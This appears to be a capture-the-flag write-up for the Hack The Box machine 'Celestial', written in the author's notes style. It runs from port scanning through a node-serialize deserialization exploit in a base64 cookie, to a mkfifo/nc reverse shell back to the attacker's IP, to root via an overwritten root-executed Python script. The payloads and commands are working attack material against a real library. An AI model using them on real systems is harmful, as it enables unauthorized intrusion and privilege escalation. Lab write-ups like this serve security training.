# Celestial (User/Root Compromise)
- Target IP: 10.129.228.94

# Recon
```bash
nmap -iL scope.txt -p- -oA Nmap/All --open -Pn

# 3000
```

```bash
nmap -iL scope.txt -p3000 -sCV -oA Nmap/sCV-3000 --open -Pn

# Output
# 3000/tcp open  http    Node.js Express framework
```

```bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt --url http://10.129.228.94:3000/

# Output
# Nada
```

- Burp intercept the base network request
```
Cookie: profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D
```

```
--- Request
{"username":null,"country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"7*7"}
--- Response
Hey Dummy 7*7 + 7*7 is 3773
```

- Following https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf

```javascript
cat test.js 
var y = {
  rce: function () {
    require("child_process").exec("ping -c 1 10.10.15.173", function (error, stdout, stderr) {
      console.log(stdout)
    });
  },
}
var serialize = require("node-serialize")
var payload_serialized = serialize.serialize(y)
console.log("Serialized: \n" + payload_serialized)
```

```json
{"rce":"_$$ND_FUNC$$_function () {\n    require(\"child_process\").exec(\"ping -c 1 10.10.15.173\", function (error, stdout, stderr) {\n      console.log(stdout)\n    });\n  }()"}
```

```
GET / HTTP/1.1
Host: 10.129.228.94:3000
Cookie: profile=eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCkge1xuICAgIHJlcXVpcmUoXCJjaGlsZF9wcm9jZXNzXCIpLmV4ZWMoXCJwaW5nIC1jIDEgMTAuMTAuMTUuMTczXCIsIGZ1bmN0aW9uIChlcnJvciwgc3Rkb3V0LCBzdGRlcnIpIHtcbiAgICAgIGNvbnNvbGUubG9nKHN0ZG91dClcbiAgICB9KTtcbiAgfSgpIn0%3D
```

```bash
tcpdump -i tun0 icmp
# 00:41:57.800263 IP htb-n8ljsdyv4m > 10.129.228.94: ICMP echo reply, id 7760, seq 1, length 64
```

```json
{"rce":"_$$ND_FUNC$$_function () {\n    require(\"child_process\").exec(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.173 443 >/tmp/f \", function (error, stdout, stderr) {\n      console.log(stdout)\n    });\n  }()"}
```

- Achieved reverse shell

```bash
sun@celestial:~$ ls
ls
Desktop    examples.desktop  output.txt  server.js  Videos
Documents  Music             Pictures    Templates
Downloads  node_modules      Public      user.txt
```
- Enumeration in Documents
```bash
sun@celestial:~/Documents$ ls -la
ls -la
total 12
drwxr-xr-x  2 sun  sun  4096 Dec  4 02:17 .
drwxr-xr-x 21 sun  sun  4096 Oct 11  2022 ..
-rw-rw-r--  1 sun  sun    29 Dec  3 22:51 script.py
lrwxrwxrwx  1 root root   18 Sep 15  2022 user.txt -> /home/sun/user.txt
```

```bash
echo 'import os;os.system("cp /root/*.txt /home/sun/Documents/root_out.txt;chown sun:sun /home/sun/Documents/root_out.txt")' > script.py
```

```bash
sun@celestial:~/Documents$ ls -la
ls -la
total 20
drwxr-xr-x  2 sun  sun  4096 Dec  4 02:30 .
drwxr-xr-x 21 sun  sun  4096 Oct 11  2022 ..
-rw-r--r--  1 sun  sun    33 Dec  4 02:30 root_out.txt
-rw-r--r--  1 root root    0 Dec  4 02:25 root.txt
-rw-rw-r--  1 sun  sun    29 Dec  3 22:51 script.py
-rw-rw-r--  1 sun  sun    29 Dec  4 02:19 script.py.bak
lrwxrwxrwx  1 root root   18 Sep 15  2022 user.txt -> /home/sun/user.txt

sun@celestial:~/Documents$ cat root_out.txt
cat root_out.txt
d7c2c83066fed2f7550b2681cd16b601
```